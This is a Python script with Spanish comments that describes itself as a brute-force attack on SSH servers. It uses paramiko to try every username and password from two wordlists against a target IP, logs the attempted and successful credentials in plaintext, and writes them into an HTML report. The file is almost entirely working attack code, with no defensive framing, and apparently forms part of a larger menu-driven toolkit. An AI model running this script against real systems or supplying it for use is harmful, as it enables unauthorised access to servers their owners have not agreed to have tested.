import time
import logging
import socket
import paramiko
import re
import argparse
import hashlib
import datetime
import os

# Configuración de logging
logging.basicConfig(filename='hibpINFO.log', format="%(asctime)s %(message)s", datefmt="%m/%d/%Y %H:%M:%S", level=logging.INFO)

# Función para conectarse al servidor SSH
def connect_ssh(ip, puerto, user, password):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        logging.info(f"Intentando con usuario: {user} y contraseña: {password}")
        cliente.connect(ip, port=puerto, username=user, password=password, timeout=5)
        logging.info(f"Autenticación exitosa con usuario: {user} y contraseña: {password}")
        return True
    except paramiko.AuthenticationException:
        logging.warning(f"Fallo en la autenticación para {user}")
    except socket.timeout:
        logging.error("Tiempo de conexión agotado")
    except paramiko.SSHException as e:
        logging.error(f"Error SSH: {e}")
    except Exception as e:
        logging.error(f"Error inesperado: {e}")
    finally:
        cliente.close()
    return False

# Función para leer líneas de archivo
def files(archivo):
    try:
        with open(archivo, 'r') as f:
            return f.read().splitlines()
    except FileNotFoundError:
        logging.error(f"No se encontró el archivo {archivo}")
        return []

# Configuración de argumentos
parser = argparse.ArgumentParser(description="Script para hacer un ataque de fuerza bruta a un servidor SSH")
parser.add_argument('-ip', help="IP", required=True)
parser.add_argument('-usuarios', help="Archivo txt de usuarios", required=True)
parser.add_argument('-contraseñas', help="Archivo txt de contraseñas", required=True)
args = parser.parse_args()

# Reporte de html
html = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Reporte de Ataque SSH</title>
</head>
<style>
*{
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: 'Open Sans';
}
body {
    background-color: #f4f4f9;
    padding: 20px;
    display: flex;
    justify-content: center;
    align-items: center;
    min-height: 100vh;
}
.contenido-reporte {
    max-width: 600px;
    background-color: #fff;
    border-radius: 8px;
    box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
    padding: 20px; text-align: center;
}
h1 {
    font-size: 1.8rem;
    color: #757373;
}
table {
    width: 100%;
    border-collapse: collapse;
    margin-top: 10px;
}
th, td {
    padding: 10px;
    border: 1px solid #ddd;
    text-align: center;
}
th {
    background-color: #536068;
    color: white;
}
tr:nth-child(even) {
    background-color: #f9f9f9;
}
</style>
<body>
<div class='contenido-reporte'>
<h1>Reporte de intentos para conectarse a un servidor SSH</h1>
<table>
<tr>
    <th>Usuario</th>
    <th>Contraseña</th>
    <th>Resultado</th>
</tr>
"""

# Variables
ip = args.ip
usuarios = args.usuarios
contraseñas = args.contraseñas
puerto = 22

resultados = []

if re.search(r'\.txt\Z', usuarios) and re.search(r'\.txt\Z', contraseñas):
    users = files(usuarios)
    passwords = files(contraseñas)
    if not users or not passwords:
        print("ERROR: Lista de usuarios o contraseñas vacía o no encontrada.")
    else:
        for user in users:
            for password in passwords:
                if connect_ssh(ip, puerto, user, password):
                    resultado = f"Ataque exitoso con {user}:{password}"
                    resultados.append({"usuario": user, "contraseña": password, "resultado": "Éxito"})
                    logging.info(resultado)
                    break
                else:
                    resultados.append({"usuario": user, "contraseña": password, "resultado": "Fallo"})
                time.sleep(5)
        for resultado in resultados:
            html += f"""
                <tr>
                    <td>{resultado['usuario']}</td>
                    <td>{resultado['contraseña']}</td>
                    <td>{resultado['resultado']}</td>
                </tr>
                """

        html += """
</table>
</div>
</body>
</html>
"""
        with open("reporte_ssh.html", "w") as f:
            f.write(html)
else:
    print("ERROR: Los archivos de usuarios y contraseñas deben ser .txt.")

# Aquí mostramos la información que aparecerá en la terminal
def calcular_hash(resultados):
    hash_md5 = hashlib.md5()
    hash_md5.update(str(resultados).encode('utf-8'))
    return hash_md5.hexdigest()

Script = "Script ejecutado: Servidor SSH"
Date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
Reporte = "reporte_ssh.html"
#nos muestra la ruta absoluta del script
ubicacion = os.path.abspath(Reporte)
print(Script)
print(Date)
print(f"Hash: {calcular_hash(resultados)}")
print(f"La información se ha guardado en: {Reporte}")
print(f"La ubicación de este script es: {ubicacion}")

input("Presiona Enter para volver al menú principal...")


